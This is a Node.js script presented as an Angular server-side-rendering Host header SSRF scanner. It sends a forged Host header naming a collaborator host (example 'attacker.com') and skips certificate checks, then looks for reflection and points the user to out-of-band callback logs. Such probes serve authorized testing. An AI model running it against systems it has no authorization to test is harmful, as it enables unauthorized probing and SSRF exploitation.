const { URL } = require('url');
const http = require('http');
const https = require('https');

const args = process.argv.slice(2);

if (args.length < 2) {
    console.log("============================================================");
    console.log("Angular SSR Host Header SSRF Scanner");
    console.log("============================================================");
    console.log("Usage: node remote_scanner.js <TARGET_URL> <COLLABORATOR_HOST>");
    console.log("\nArguments:");
    console.log("  TARGET_URL        The full URL of the page to test (e.g., https://target.com/dashboard)");
    console.log("  COLLABORATOR_HOST The host you want the server to connect to (e.g., attacker.com)");
    console.log("\nExample:");
    console.log("  node remote_scanner.js https://example.com/news attacker.com");
    console.log("============================================================");
    process.exit(1);
}

const target = args[0];
const collaborator = args[1];

console.log(`\n[+] Target:       ${target}`);
console.log(`[+] Injecting:    Host: ${collaborator}`);
console.log(`[+] Action:       Sending HTTP request...`);

try {
    const url = new URL(target);
    const isHttps = url.protocol === 'https:';
    const lib = isHttps ? https : http;
    
    const options = {
        hostname: url.hostname,
        port: url.port || (isHttps ? 443 : 80),
        path: url.pathname + url.search,
        method: 'GET',
        headers: {
            'Host': collaborator,
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        },
        rejectUnauthorized: false // Allow testing targets with self-signed certs
    };

    const req = lib.request(options, (res) => {
        console.log(`\n[+] Response Status: ${res.statusCode} ${res.statusMessage}`);
        
        let body = '';
        res.on('data', (chunk) => body += chunk);
        res.on('end', () => {
            console.log(`[+] Response Body Size: ${body.length} bytes`);
            
            // Analysis
            console.log(`\n[?] Analysis:`);
            
            if (res.statusCode >= 300 && res.statusCode < 400) {
                console.log(`    - Redirect detected to: ${res.headers.location}`);
                if (res.headers.location && res.headers.location.includes(collaborator)) {
                    console.log(`    - [VULNERABLE] Host header reflected in Location header!`);
                }
            }

            if (body.includes(collaborator)) {
                console.log(`    - [INFO] Collaborator host '${collaborator}' found in response body.`);
                console.log(`      This might indicate the Host header is being used to generate links.`);
            } else {
                console.log(`    - Collaborator host not found in text body.`);
            }

            console.log(`\n[!] NEXT STEPS:`);
            console.log(`    1. Check your collaborator server logs (${collaborator}).`);
            console.log(`    2. Did you receive an HTTP request?`);
            console.log(`       - YES: The target is VULNERABLE to SSRF.`);
            console.log(`       - NO:  The target might not be making relative API calls on this specific page.`);
        });
    });

    req.on('error', (e) => {
        console.error(`\n[-] Request Error: ${e.message}`);
        console.error(`    Make sure the target URL is reachable.`);
    });

    req.end();

} catch (e) {
    console.error(`\n[-] Error: Invalid URL format - ${target}`);
}
